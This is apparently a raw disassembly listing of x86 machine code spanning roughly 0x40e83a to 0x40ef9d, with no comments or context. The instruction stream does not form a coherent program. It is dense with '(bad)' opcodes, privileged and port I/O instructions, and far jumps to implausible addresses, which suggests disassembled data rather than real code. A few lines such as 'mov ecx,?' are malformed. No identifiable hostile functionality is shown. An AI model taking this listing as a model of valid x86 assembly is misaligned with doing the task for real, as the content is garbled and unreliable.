  40e83a:	add    eax,0xa44177ee
  40e83f:	mov    BYTE PTR [edi],dl
  40e841:	sub    edx,DWORD PTR [eax-0x9]
  40e844:	jno    0x40e802
  40e846:	sti    
  40e847:	fisub  WORD PTR [edi]
  40e849:	xlat   BYTE PTR ds:[ebx]
  40e84a:	js     0x40e8b4
  40e84c:	shr    BYTE PTR [ebp+0x63],cl
  40e84f:	stos   BYTE PTR es:[edi],al
  40e850:	push   ds
  40e851:	mov    WORD PTR [edx+0x5d1f8b14],cs
  40e857:	ja     0x40e85b
  40e859:	sub    al,0x39
  40e85b:	xchg   ebp,eax
  40e85c:	dec    ebp
  40e85d:	sub    BYTE PTR [ecx+0x4cfa6399],bl
  40e863:	pop    es
  40e864:	mov    bx,0x569a
  40e868:	pushf  
  40e869:	out    dx,eax
  40e86a:	imul   ebp,DWORD PTR [eax-0x1f],0x5bd7409a
  40e871:	push   edx
  40e872:	xchg   ebp,eax
  40e873:	dec    eax
  40e874:	arpl   WORD PTR [edx-0x27],di
  40e877:	ins    BYTE PTR es:[edi],dx
  40e878:	iret   
  40e879:	mov    cl,0x88
  40e87b:	retf   
  40e87c:	es mov esp,0xb5ea1854
  40e882:	cmp    al,BYTE PTR [edx]
  40e884:	test   al,0x10
  40e886:	leave  
  40e887:	inc    eax
  40e888:	repz inc edi
  40e88a:	jl     0x40e89d
  40e88c:	loopne 0x40e8c1
  40e88e:	stos   DWORD PTR es:[edi],eax
  40e88f:	xchg   esi,eax
  40e890:	das    
  40e891:	sahf   
  40e892:	sub    esp,DWORD PTR [esi]
  40e894:	out    dx,al
  40e895:	adc    bl,BYTE PTR [eax-0x41]
  40e898:	mov    ss,WORD PTR [edi]
  40e89a:	xor    BYTE PTR [eax+0x6bca4eab],bh
  40e8a0:	mov    ebp,0xa2267d6b
  40e8a5:	push   ss
  40e8a6:	jae    0x40e903
  40e8a8:	out    0x39,eax
  40e8aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8ab:	add    al,0x56
  40e8ad:	add    ebp,DWORD PTR [ebx-0x7d]
  40e8b0:	rcl    BYTE PTR [edx+0x5e],cl
  40e8b3:	xchg   BYTE PTR [esi+edx*2],al
  40e8b6:	mov    ebp,0xc0d015fa
  40e8bb:	into   
  40e8bc:	push   esi
  40e8bd:	push   edi
  40e8be:	dec    edx
  40e8bf:	retf   
  40e8c0:	push   esi
  40e8c1:	lahf   
  40e8c2:	inc    ebp
  40e8c3:	cmp    esi,esp
  40e8c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8c6:	push   ss
  40e8c7:	(bad)  
  40e8c8:	dec    eax
  40e8c9:	jno    0x40e915
  40e8cb:	loop   0x40e90d
  40e8cd:	sbb    bh,ch
  40e8cf:	std    
  40e8d0:	ins    BYTE PTR es:[edi],dx
  40e8d1:	jnp    0x40e863
  40e8d3:	int    0x67
  40e8d5:	jmp    0x63fb:0xa1df88
  40e8dc:	ins    BYTE PTR es:[edi],dx
  40e8dd:	test   al,0xa4
  40e8df:	jmp    0x40e892
  40e8e1:	lock ret 0xb012
  40e8e5:	cmp    DWORD PTR [ecx-0x3c0ac0b9],0x30
  40e8ec:	mov    ds:0xadd19e05,al
  40e8f1:	add    BYTE PTR [edx+0x45c91550],bh
  40e8f7:	inc    ecx
  40e8f8:	xor    eax,0xb61c8ace
  40e8fd:	add    dl,ch
  40e8ff:	scas   eax,DWORD PTR es:[edi]
  40e900:	push   ds
  40e901:	inc    esi
  40e902:	xchg   edi,eax
  40e903:	sub    al,0x4b
  40e905:	ja     0x40e954
  40e907:	pop    ds
  40e908:	and    al,0x75
  40e90a:	mov    edi,0xa166aafc
  40e90f:	and    BYTE PTR [ecx+0x8],0x83
  40e913:	retf   
  40e914:	gs jb  0x40e8bb
  40e917:	mul    BYTE PTR [edx]
  40e919:	adc    eax,0x26b4677c
  40e91e:	lods   eax,DWORD PTR ds:[esi]
  40e91f:	shl    cl,1
  40e921:	mov    ch,0x2a
  40e923:	cwde   
  40e924:	jge    0x40e90c
  40e926:	xor    eax,0xc68e314f
  40e92b:	in     eax,0xb5
  40e92d:	std    
  40e92e:	call   0x7f31:0x486d9fd2
  40e935:	in     eax,dx
  40e936:	fs and eax,0xf3815849
  40e93c:	mov    bh,0x93
  40e93e:	add    cl,BYTE PTR [ebx+0x41458f93]
  40e944:	push   es
  40e945:	pop    ss
  40e946:	and    esp,DWORD PTR [eax]
  40e948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e949:	and    DWORD PTR [edi],esi
  40e94b:	sbb    dh,BYTE PTR [esi-0x19]
  40e94e:	jne    0x40e931
  40e950:	ret    0x8c9f
  40e953:	loope  0x40e982
  40e955:	bound  esi,QWORD PTR [ebx-0x7120c55c]
  40e95b:	cmp    al,bh
  40e95d:	mov    ebp,0xecf49f81
  40e962:	cmp    BYTE PTR [ecx],cl
  40e964:	outs   dx,DWORD PTR ds:[esi]
  40e965:	mov    DWORD PTR [edx+0x15],ecx
  40e968:	setle  BYTE PTR [esi+0x79a8d0da]
  40e96f:	sbb    al,0x6
  40e971:	mov    dl,0xe
  40e973:	sbb    al,0x30
  40e975:	sub    bl,0xb3
  40e978:	mov    al,0x5
  40e97a:	push   ecx
  40e97b:	arpl   WORD PTR [bp+si],di
  40e97e:	fistp  DWORD PTR [ebx]
  40e980:	dec    ebx
  40e981:	test   BYTE PTR [esi+0x6f2cab6a],al
  40e987:	fwait
  40e988:	sub    eax,0x7bf1e5cb
  40e98d:	scas   al,BYTE PTR es:[edi]
  40e98e:	jmp    0x8af5fc56
  40e993:	int3   
  40e994:	retf   0x65f0
  40e997:	sbb    al,0x93
  40e999:	cdq    
  40e99a:	sub    dh,BYTE PTR [ebp-0x672f61e7]
  40e9a0:	jo     0x40e965
  40e9a2:	dec    edi
  40e9a3:	lea    eax,[edi+0x17]
  40e9a6:	imul   ebx,ecx,0x4
  40e9a9:	jle    0x40ea27
  40e9ab:	push   eax
  40e9ac:	and    al,0x8f
  40e9ae:	lock ins DWORD PTR es:[edi],dx
  40e9b0:	and    ebx,DWORD PTR [ecx-0x156c0aaf]
  40e9b6:	pop    ecx
  40e9b7:	cmp    DWORD PTR [esi-0x1666e636],0x5ceaf28d
  40e9c1:	sahf   
  40e9c2:	pop    ds
  40e9c3:	mov    WORD PTR [edx-0x2a6da6e5],ss
  40e9c9:	xor    DWORD PTR [esi+0x28],ebx
  40e9cc:	(bad)  
  40e9cd:	and    ah,BYTE PTR [esi-0x40]
  40e9d0:	mov    bl,0x3d
  40e9d2:	mov    al,dh
  40e9d4:	jbe    0x40e9dc
  40e9d6:	sub    DWORD PTR [edx],esi
  40e9d8:	pop    ebp
  40e9d9:	add    bh,bl
  40e9db:	sub    DWORD PTR [eax-0x10aa0daa],ecx
  40e9e1:	rol    BYTE PTR [edx-0x5ef8cfe5],0x8a
  40e9e8:	ret    0xa059
  40e9eb:	or     al,0xa9
  40e9ed:	and    al,BYTE PTR [ecx+edi*8+0x73f1abb4]
  40e9f4:	int    0x8
  40e9f6:	sbb    ecx,ebp
  40e9f8:	pop    edi
  40e9f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9fa:	pop    esi
  40e9fc:	jb     0x40e9aa
  40e9fe:	jge    0x40ea73
  40ea00:	pop    ecx
  40ea01:	(bad)  
  40ea05:	xor    BYTE PTR [edi+0x6d],bl
  40ea08:	mov    al,ds:0x3c615dcb
  40ea0d:	ds inc edi
  40ea0f:	dec    ecx
  40ea10:	inc    esp
  40ea11:	(bad)  
  40ea14:	xlat   BYTE PTR ds:[ebx]
  40ea15:	(bad)  
  40ea16:	and    BYTE PTR [ebp-0x55],al
  40ea19:	adc    al,0x34
  40ea1b:	push   cs
  40ea1c:	pop    eax
  40ea1d:	pusha  
  40ea1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea1f:	aam    0xcc
  40ea21:	shl    BYTE PTR [eax*1+0x141794ec],cl
  40ea28:	jno    0x40ea6f
  40ea2a:	sbb    al,0xc3
  40ea2c:	mov    esi,0x3121d4c6
  40ea31:	mov    bl,0x2a
  40ea33:	and    eax,0xdd51c525
  40ea38:	cld    
  40ea39:	push   ss
  40ea3a:	mov    bl,bh
  40ea3c:	retf   0x73db
  40ea3f:	sbb    BYTE PTR [ebx-0x58],cl
  40ea42:	ins    BYTE PTR es:[edi],dx
  40ea43:	mov    ds:0x7117921f,eax
  40ea48:	cld    
  40ea49:	aam    0x0
  40ea4b:	sub    bh,ah
  40ea4d:	je     0x40ea65
  40ea4f:	inc    esi
  40ea50:	clc    
  40ea51:	xchg   esp,ecx
  40ea53:	ret    0xd594
  40ea56:	sbb    eax,0x5752f72d
  40ea5b:	push   esi
  40ea5c:	loopne 0x40ea44
  40ea5e:	xor    eax,0xf2a84da5
  40ea63:	xor    dl,BYTE PTR [ecx]
  40ea65:	dec    esp
  40ea66:	sbb    dl,cl
  40ea68:	(bad)  
  40ea69:	sbb    eax,0x45b4bbcd
  40ea6e:	(bad)  
  40ea6f:	into   
  40ea70:	in     al,dx
  40ea71:	int    0xf8
  40ea73:	dec    ebx
  40ea74:	test   DWORD PTR [edi+0x777a81b6],ebp
  40ea7a:	cmp    ebp,edi
  40ea7c:	mov    bl,0x89
  40ea7e:	cmp    DWORD PTR [edx+0x28],edx
  40ea81:	test   DWORD PTR [ebx],ebp
  40ea83:	mov    ecx,0x2e10b5a5
  40ea88:	pop    edi
  40ea89:	add    BYTE PTR [ebx-0x3b],ah
  40ea8c:	sbb    dl,BYTE PTR [ecx+eiz*8+0x64]
  40ea90:	pushf  
  40ea91:	(bad)  
  40ea93:	inc    ebp
  40ea94:	jge    0x40ea83
  40ea96:	jp     0x40eb16
  40ea98:	enter  0x7734,0xd6
  40ea9c:	cmp    ecx,DWORD PTR [edi]
  40ea9e:	imul   edx,DWORD PTR [ebx+ebx*2-0x7e],0xd4c67c5d
  40eaa6:	add    eax,0x32202213
  40eaab:	sar    ch,1
  40eaad:	sar    DWORD PTR [edi],0xd7
  40eab0:	out    dx,eax
  40eab1:	ja     0x40eaf9
  40eab3:	mov    dh,0x32
  40eab5:	adc    BYTE PTR [ebp-0xb121a09],ch
  40eabb:	jecxz  0x40eade
  40eabd:	push   ecx
  40eabe:	mov    BYTE PTR [edx+0x6a3d0eed],0x7e
  40eac5:	call   0xc563:0xc65e1bb4
  40eacc:	push   esi
  40eacd:	mov    esi,DWORD PTR [ebx+0x5c]
  40ead0:	xchg   ecx,eax
  40ead1:	jmp    0x40eaeb
  40ead3:	cmp    DWORD PTR [edi-0x7d],esi
  40ead6:	mov    ah,0x86
  40ead8:	cmp    eax,0xc77ee280
  40eadd:	push   ebp
  40eade:	mov    ecx,?
  40eae0:	cdq    
  40eae1:	std    
  40eae2:	sbb    esp,DWORD PTR [edx-0x56f14e5]
  40eae8:	dec    ebx
  40eae9:	fidivr DWORD PTR [ecx]
  40eaeb:	cmp    BYTE PTR [edi-0x69],ah
  40eaee:	cmp    al,BYTE PTR [esi-0x4985c3e4]
  40eaf4:	add    BYTE PTR [edx+0x2b],al
  40eaf7:	xor    BYTE PTR [edi+0x67],dh
  40eafa:	test   DWORD PTR [esi],ecx
  40eafc:	mov    BYTE PTR [edi+0x66],ch
  40eaff:	push   ecx
  40eb00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb01:	xchg   edi,eax
  40eb02:	mov    bl,0x82
  40eb04:	ins    BYTE PTR es:[edi],dx
  40eb05:	xor    BYTE PTR ds:0x88ef320e,dh
  40eb0b:	pushf  
  40eb0c:	(bad)
  40eb0f:	jge    0x40eaee
  40eb11:	xlat   BYTE PTR ds:[ebx]
  40eb12:	and    ch,BYTE PTR ds:0xee718e85
  40eb18:	mov    eax,ebx
  40eb1a:	test   DWORD PTR [edi],esp
  40eb1c:	inc    ecx
  40eb1d:	and    cl,cl
  40eb1f:	ret    
  40eb20:	sbb    eax,0x4b5287ff
  40eb25:	shl    DWORD PTR ds:0xeb3c3962,0x7
  40eb2c:	hlt    
  40eb2d:	push   ebp
  40eb2e:	or     eax,0xffffff8f
  40eb31:	or     BYTE PTR [esi+0x48],0x31
  40eb35:	repz test DWORD PTR [ebx-0xf52d4f],0xbba74896
  40eb40:	or     BYTE PTR [edx+0x71ac7dd9],dh
  40eb46:	ds dec esi
  40eb48:	mov    WORD PTR [ebp+0x5caa0e2c],ss
  40eb4e:	inc    eax
  40eb4f:	out    dx,al
  40eb50:	jnp    0x40eaf3
  40eb52:	xor    eax,0x210afec2
  40eb57:	jnp    0x40ebc3
  40eb59:	imul   edi,DWORD PTR [ebp-0x43],0x28
  40eb5d:	pop    esp
  40eb5e:	popf   
  40eb5f:	xchg   edi,eax
  40eb60:	xor    DWORD PTR [esi+0x46904be9],edi
  40eb66:	imul   BYTE PTR ds:0x8522dfd2
  40eb6c:	loopne 0x40eb0f
  40eb6e:	outs   dx,DWORD PTR ds:[esi]
  40eb6f:	sub    BYTE PTR ds:0xc0b8143d,ah
  40eb75:	scas   al,BYTE PTR es:[edi]
  40eb76:	shl    DWORD PTR ss:[eax],0xa7
  40eb7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb7b:	or     edi,edi
  40eb7d:	pop    edi
  40eb7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb7f:	dec    esi
  40eb80:	mov    WORD PTR [ebp+ebp*2-0x725ddc10],gs
  40eb87:	xor    DWORD PTR [ecx],eax
  40eb89:	fdiv   DWORD PTR [edx-0x19]
  40eb8c:	neg    DWORD PTR [eax+0xb]
  40eb8f:	mov    ebx,?
  40eb91:	xor    eax,0x624aadf7
  40eb96:	push   edi
  40eb97:	leave  
  40eb98:	jge    0x40eb52
  40eb9a:	xchg   edi,eax
  40eb9b:	div    ah
  40eb9d:	and    DWORD PTR [ebx-0x455a17ff],eax
  40eba3:	arpl   WORD PTR [edx+ecx*1],dx
  40eba6:	mov    ebp,0xef26f28f
  40ebab:	push   ss
  40ebac:	cld    
  40ebad:	enter  0x9cc4,0x5e
  40ebb1:	mov    al,ds:0x2ed98129
  40ebb6:	push   es
  40ebb7:	imul   edx,DWORD PTR [ecx+0x2653d626],0x7c6a8a5
  40ebc1:	cmp    ecx,esp
  40ebc3:	les    eax,FWORD PTR ds:[ecx+esi*1+0x61c5e559]
  40ebcb:	pavgw  mm2,QWORD PTR [ebp-0x7d]
  40ebcf:	call   0x73e395ff
  40ebd4:	pop    eax
  40ebd5:	pop    ebp
  40ebd6:	js     0x40eb83
  40ebd8:	mov    edx,0x871f7ee3
  40ebdd:	inc    ecx
  40ebde:	xor    al,0x39
  40ebe0:	test   esi,esp
  40ebe2:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40ebe4:	nop
  40ebe5:	xor    bh,BYTE PTR [ecx-0x7c519b4]
  40ebeb:	imul   edx,DWORD PTR [edx+ecx*2-0x1e21788e],0xac81ff81
  40ebf6:	clc    
  40ebf7:	push   ebp
  40ebf8:	adc    ebx,DWORD PTR [ebx]
  40ebfa:	imul   ecx,DWORD PTR [edx],0x2f995aa
  40ec00:	jae    0x40ec5b
  40ec02:	adc    al,BYTE PTR [eax+0x4c]
  40ec05:	mov    eax,ds:0x1ee8bc24
  40ec0a:	push   edx
  40ec0b:	sbb    al,0x94
  40ec0d:	or     BYTE PTR [ebp+ecx*1-0x319352be],dh
  40ec14:	mov    eax,ds:0x8e90c24
  40ec19:	push   esp
  40ec1a:	cmp    ecx,edi
  40ec1c:	sbb    DWORD PTR [edx+ebx*4],esp
  40ec1f:	mov    edi,0x61e026a3
  40ec24:	inc    esi
  40ec25:	icebp  
  40ec26:	stos   BYTE PTR es:[edi],al
  40ec27:	inc    edi
  40ec28:	xchg   dl,dh
  40ec2a:	dec    edi
  40ec2b:	push   ecx
  40ec2c:	retf   
  40ec2d:	shr    ch,1
  40ec2f:	pop    esi
  40ec30:	push   cs
  40ec31:	push   eax
  40ec32:	fistp  DWORD PTR [ebx-0x56]
  40ec35:	scas   eax,DWORD PTR es:[edi]
  40ec36:	loop   0x40ec5d
  40ec38:	test   eax,0xf23c9c03
  40ec3d:	out    0xa6,al
  40ec3f:	test   eax,0xe58bb87c
  40ec44:	test   DWORD PTR [edi],esi
  40ec46:	fidivr DWORD PTR [edx-0x126e9086]
  40ec4c:	pop    ebx
  40ec4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec4e:	test   DWORD PTR [edi+0x31ff9d81],0x6c2ff016
  40ec58:	dec    ebp
  40ec59:	adc    dh,0xa7
  40ec5c:	jmp    0x2011775e
  40ec61:	ror    DWORD PTR [ebx+0x17d73e0b],0x89
  40ec68:	shl    BYTE PTR ds:0x33c7d687,cl
  40ec6e:	adc    bl,BYTE PTR [ebx-0x483f108f]
  40ec74:	jo     0x40ec53
  40ec76:	pushf  
  40ec77:	ror    DWORD PTR [edi-0x557e717b],0xc9
  40ec7e:	pushf  
  40ec7f:	ss jns 0x40eccc
  40ec82:	mov    esi,0x2f06b87c
  40ec87:	das    
  40ec88:	dec    esp
  40ec89:	jg     0x40eceb
  40ec8b:	sub    BYTE PTR [edi],ch
  40ec8d:	arpl   WORD PTR [eax],si
  40ec8f:	mov    eax,0x2b9519d6
  40ec94:	mov    ebx,0xde5d7703
  40ec99:	inc    esp
  40ec9a:	out    0xcf,al
  40ec9c:	cmp    ch,BYTE PTR [ebp+0x4ce10de]
  40eca2:	inc    ebx
  40eca3:	mov    edi,0x79135778
  40eca8:	pop    edx
  40eca9:	aad    0x97
  40ecab:	shl    BYTE PTR [esi+0x42d58eca],0xfc
  40ecb2:	push   ebp
  40ecb3:	shr    BYTE PTR [ebx-0x698bdf4d],0x8d
  40ecba:	int    0x79
  40ecbc:	push   cs
  40ecbd:	pusha  
  40ecbe:	adc    al,0x47
  40ecc0:	idiv   DWORD PTR [ebp-0x125c0078]
  40ecc6:	inc    ecx
  40ecc7:	popa   
  40ecc8:	add    al,BYTE PTR [ecx+0x55e5a859]
  40ecce:	call   0xfb16:0x7f6f87a5
  40ecd5:	(bad)  
  40ecd6:	retf   0x92
  40ecd9:	mov    al,0x2e
  40ecdb:	xor    DWORD PTR [eax-0x68205d14],0x21040054
  40ece5:	mov    edi,0x42ab77cf
  40ecea:	push   eax
  40eceb:	xchg   DWORD PTR [ebx+0x2dd2e9e6],esi
  40ecf1:	into   
  40ecf2:	xchg   BYTE PTR [ecx],al
  40ecf4:	scas   eax,DWORD PTR es:[edi]
  40ecf5:	repz mov dl,0x6d
  40ecf8:	push   ecx
  40ecf9:	mov    dh,ah
  40ecfb:	shr    edi,0x7c
  40ecfe:	mov    ecx,0xd5c8ca48
  40ed03:	inc    esi
  40ed04:	(bad)  
  40ed05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed06:	test   eax,0x799a04f1
  40ed0b:	mov    dl,0xee
  40ed0d:	stos   DWORD PTR es:[edi],eax
  40ed0e:	or     BYTE PTR [edi],dh
  40ed10:	addr16 dec esi
  40ed12:	mov    eax,ds:0x744da14e
  40ed17:	sbb    eax,0xffffffcf
  40ed1a:	in     eax,dx
  40ed1b:	push   0x4f
  40ed1d:	mov    ds:0x8f89b921,eax
  40ed22:	fsubr  QWORD PTR [edi]
  40ed24:	xchg   DWORD PTR [ecx],edx
  40ed26:	call   0xb72b:0xaa449afb
  40ed2d:	(bad)  
  40ed2e:	cli    
  40ed2f:	sahf   
  40ed30:	mov    ebx,0xa5f59acf
  40ed35:	pop    ebp
  40ed36:	pop    esp
  40ed37:	out    0xfb,eax
  40ed39:	jp     0x40eda5
  40ed3b:	cs int3 
  40ed3d:	mov    ebx,ecx
  40ed3f:	retf   0x1045
  40ed42:	dec    dx
  40ed44:	mov    eax,0x7bd74998
  40ed49:	jmp    0x838bc612
  40ed4e:	shl    edx,0xf9
  40ed51:	in     al,0x85
  40ed53:	and    cl,BYTE PTR [esi+ebp*8+0x18]
  40ed57:	add    al,0xe0
  40ed59:	icebp  
  40ed5a:	and    bl,BYTE PTR [ebp-0xe]
  40ed5d:	(bad)  
  40ed5e:	mov    edi,0x98796dea
  40ed63:	sahf   
  40ed64:	adc    BYTE PTR [edx+edx*4],ch
  40ed67:	mov    bh,0x71
  40ed69:	retf   0x6605
  40ed6c:	repnz inc esi
  40ed6e:	into   
  40ed6f:	jb     0x40ed63
  40ed71:	ret    0xaa0e
  40ed74:	imul   ebp,DWORD PTR [edi],0x1d
  40ed77:	test   DWORD PTR [eax],esp
  40ed79:	rcr    BYTE PTR [eax-0x12],1
  40ed7c:	jmp    0x4245b605
  40ed81:	mov    BYTE PTR [edx],ch
  40ed83:	hlt    
  40ed84:	pop    esi
  40ed85:	std    
  40ed86:	stc    
  40ed87:	sbb    eax,0x4cd89aa6
  40ed8c:	mov    ah,0x8d
  40ed8e:	mov    bh,0x6
  40ed90:	(bad)  
  40ed91:	mov    al,0x1a
  40ed93:	sbb    eax,0x2a01fa50
  40ed98:	bound  ebx,QWORD PTR [eax]
  40ed9a:	popf   
  40ed9b:	push   ss
  40ed9c:	loope  0x40edf9
  40ed9e:	fs test al,0x5e
  40eda1:	daa    
  40eda2:	xor    esi,DWORD PTR [ecx]
  40eda4:	popa   
  40eda5:	xchg   ebx,eax
  40eda6:	sbb    eax,0x7e088c15
  40edab:	rcl    BYTE PTR [ecx-0x19],1
  40edae:	or     BYTE PTR [ebx-0x3c],dl
  40edb1:	sub    BYTE PTR [ebp-0x51],bl
  40edb4:	rcl    bh,cl
  40edb6:	xor    al,0xc0
  40edb8:	enter  0xabc8,0x66
  40edbc:	fbld   TBYTE PTR [eax+eax*1]
  40edbf:	popf   
  40edc0:	cmp    BYTE PTR [esi-0x69f09380],0xb6
  40edc7:	push   ss
  40edc8:	pop    ecx
  40edc9:	fcomp  QWORD PTR [ebp-0x24]
  40edcc:	int    0xbd
  40edce:	xor    bl,BYTE PTR [ebp-0x2518932c]
  40edd4:	push   ebx
  40edd5:	mov    ecx,0xe6b1be0c
  40edda:	mov    ebx,0xfe84c2c3
  40eddf:	adc    bh,dl
  40ede1:	adc    DWORD PTR [edi-0x1e],ecx
  40ede4:	mov    bh,0x12
  40ede6:	jne    0x40ee61
  40ede8:	mov    al,0x59
  40edea:	xchg   ch,ah
  40edec:	sti    
  40eded:	xchg   ebp,eax
  40edee:	pusha  
  40edef:	xor    esi,esi
  40edf1:	pop    eax
  40edf2:	push   0x2e
  40edf4:	arpl   WORD PTR [edx],ax
  40edf6:	mov    al,ds:0x5f1e494b
  40edfb:	iret   
  40edfc:	push   0xffffffc3
  40edfe:	sub    BYTE PTR [eax-0x34],0x53
  40ee02:	iret   
  40ee03:	clc    
  40ee04:	test   BYTE PTR [esi+0x36],ch
  40ee07:	icebp  
  40ee08:	retf   0xf8ac
  40ee0b:	add    eax,0x218a2fdf
  40ee10:	mov    fs,WORD PTR [ebx+0x22100922]
  40ee16:	sti    
  40ee17:	repnz (bad) 
  40ee19:	cwde   
  40ee1a:	and    bl,dl
  40ee1c:	dec    edx
  40ee1d:	jmp    FWORD PTR ds:0xb3384678
  40ee23:	dec    ebx
  40ee24:	cli    
  40ee25:	cmp    edi,DWORD PTR [ebp-0x24]
  40ee28:	fnstcw WORD PTR fs:[edx]
  40ee2b:	mov    esp,0xa96fe89b
  40ee30:	test   eax,0x4808e3e
  40ee35:	cmp    esi,ecx
  40ee37:	sbb    dl,BYTE PTR [ebp-0x26d37329]
  40ee3d:	call   DWORD PTR [edi-0x5051cb52]
  40ee43:	(bad)  
  40ee44:	leave  
  40ee45:	xchg   ecx,eax
  40ee46:	stos   DWORD PTR es:[edi],eax
  40ee47:	xor    DWORD PTR [ebp+0x720975e3],edi
  40ee4d:	jo     0x40ee71
  40ee4f:	and    cl,BYTE PTR [esi+0x25]
  40ee52:	retf   
  40ee53:	sbb    al,0x67
  40ee55:	ins    BYTE PTR es:[edi],dx
  40ee56:	xor    DWORD PTR [esi],ebp
  40ee58:	outs   dx,BYTE PTR ds:[esi]
  40ee59:	jmp    0x40ee5d
  40ee5b:	and    bl,BYTE PTR [edi]
  40ee5d:	fmul   st(2),st
  40ee5f:	mov    eax,ds:0x530ed0dc
  40ee64:	in     eax,0x76
  40ee66:	stc    
  40ee67:	data16 sbb WORD PTR [esi-0x746d1bf9],dx
  40ee6f:	ja     0x40ee09
  40ee71:	iret   
  40ee72:	stc    
  40ee73:	ret    0x1eaf
  40ee76:	fwait
  40ee77:	cld    
  40ee78:	cmp    ebp,DWORD PTR [edi-0x27]
  40ee7b:	xchg   edx,eax
  40ee7c:	adc    edi,edi
  40ee7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee7f:	xchg   edi,eax
  40ee80:	ins    DWORD PTR es:[edi],dx
  40ee81:	and    edi,DWORD PTR ss:[ebp+0x70]
  40ee85:	jp     0x40ee5b
  40ee87:	or     al,0xf0
  40ee89:	mov    dl,0x42
  40ee8b:	jge    0x40ee43
  40ee8d:	das    
  40ee8e:	sti    
  40ee8f:	ret    
  40ee90:	addr16 or al,0x69
  40ee93:	ja     0x40ee61
  40ee95:	pop    esi
  40ee96:	pop    ss
  40ee97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee98:	mov    dh,0x6e
  40ee9a:	scas   eax,DWORD PTR es:[edi]
  40ee9b:	mov    eax,0x4cd2a405
  40eea0:	out    dx,eax
  40eea1:	mov    cl,0xda
  40eea3:	loop   0x40ef03
  40eea5:	loop   0x40eef6
  40eea7:	jmp    0x689fff62
  40eeac:	pop    es
  40eead:	les    edi,FWORD PTR [edi+0x45]
  40eeb0:	cmc    
  40eeb1:	stc    
  40eeb2:	jbe    0x40ef29
  40eeb4:	xchg   edx,eax
  40eeb5:	fdivr  st,st(4)
  40eeb7:	inc    ebx
  40eeb8:	scas   eax,DWORD PTR es:[edi]
  40eeb9:	aas    
  40eeba:	pop    ecx
  40eebb:	out    0xe7,eax
  40eebd:	and    al,0xd9
  40eebf:	mov    esi,0xf57047b0
  40eec4:	leave  
  40eec5:	out    dx,al
  40eec6:	jno    0x40eefa
  40eec8:	aaa    
  40eec9:	jns    0x40ee57
  40eecb:	mov    ebp,edx
  40eecd:	loope  0x40ef44
  40eecf:	mov    dl,0xbc
  40eed1:	leave  
  40eed2:	mov    al,ds:0xb77a32e9
  40eed7:	and    dl,dh
  40eed9:	xchg   esp,eax
  40eeda:	push   ds
  40eedb:	ds push edi
  40eedd:	das    
  40eede:	in     al,dx
  40eedf:	and    DWORD PTR [esi+esi*8-0x25b7bb6e],edi
  40eee6:	pop    ecx
  40eee7:	push   cs
  40eee8:	jge    0x40ef1e
  40eeea:	jmp    0x40ee77
  40eeec:	pop    esp
  40eeed:	dec    ebp
  40eeee:	pop    esi
  40eeef:	test   DWORD PTR [edi],esp
  40eef1:	pop    esi
  40eef2:	sub    edx,edi
  40eef4:	sub    BYTE PTR [esi+0x7],0x52
  40eef8:	dec    esp
  40eef9:	repz pushf 
  40eefb:	cmp    eax,0xed64be91
  40ef00:	xchg   ebp,eax
  40ef01:	lds    edi,FWORD PTR ds:0xab6b916e
  40ef07:	push   ds
  40ef08:	xor    edi,DWORD PTR [ecx]
  40ef0a:	out    dx,eax
  40ef0b:	out    0xd2,al
  40ef0d:	icebp  
  40ef0e:	clc    
  40ef0f:	scas   eax,DWORD PTR es:[edi]
  40ef10:	jl     0x40ef8d
  40ef12:	inc    ebx
  40ef13:	nop
  40ef14:	fld    QWORD PTR [ebx+0x47ec4860]
  40ef1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef1b:	jbe    0x40eeef
  40ef1d:	sbb    eax,0x7e71095a
  40ef22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef23:	cli    
  40ef24:	xor    DWORD PTR [ecx],eax
  40ef26:	sar    DWORD PTR [edx],0x11
  40ef29:	loop   0x40eed3
  40ef2b:	nop
  40ef2c:	xor    al,0xa
  40ef2e:	shr    BYTE PTR [ecx],1
  40ef30:	pop    eax
  40ef31:	adc    BYTE PTR [edx+eax*2-0x35],cl
  40ef35:	push   ds
  40ef36:	pminsw mm1,QWORD PTR [ecx]
  40ef39:	(bad)
  40ef3c:	jmp    0xefccf26e
  40ef41:	jmp    0x3f05e4cb
  40ef46:	pusha  
  40ef47:	dec    edx
  40ef48:	mov    DWORD PTR [esi],esi
  40ef4a:	shl    BYTE PTR [edx+0x45e21c75],1
  40ef50:	xchg   DWORD PTR [ecx+ecx*1],ebx
  40ef53:	gs xchg ebx,eax
  40ef55:	arpl   WORD PTR cs:0xa84a7ccb,bp
  40ef5c:	data16 std 
  40ef5e:	xor    cl,bl
  40ef60:	lods   al,BYTE PTR ds:[esi]
  40ef61:	jp     0x40ef73
  40ef63:	mov    bl,0x50
  40ef65:	or     cl,0xba
  40ef68:	loope  0x40ef43
  40ef6a:	pop    ebp
  40ef6b:	mov    ecx,DWORD PTR [ebp+0x23]
  40ef6e:	aam    0x2a
  40ef70:	jp     0x40ef72
  40ef72:	xchg   edx,eax
  40ef73:	pop    ds
  40ef74:	mov    DWORD PTR [ebp-0x7a454df6],edi
  40ef7a:	or     ah,BYTE PTR [edx]
  40ef7c:	adc    al,0x90
  40ef7e:	jmp    0x98c63675
  40ef83:	test   eax,0x3d032724
  40ef88:	add    esp,ecx
  40ef8a:	pusha  
  40ef8b:	bound  edi,QWORD PTR [ebx-0x4b]
  40ef8e:	sub    edx,DWORD PTR [edi-0x5f]
  40ef91:	dec    ecx
  40ef92:	push   ebp
  40ef93:	sbb    eax,0xcf7f3917
  40ef98:	les    ebp,FWORD PTR [ebx]
  40ef9a:	dec    edx
  40ef9b:	test   al,0x9b
  40ef9d:	int    0x84
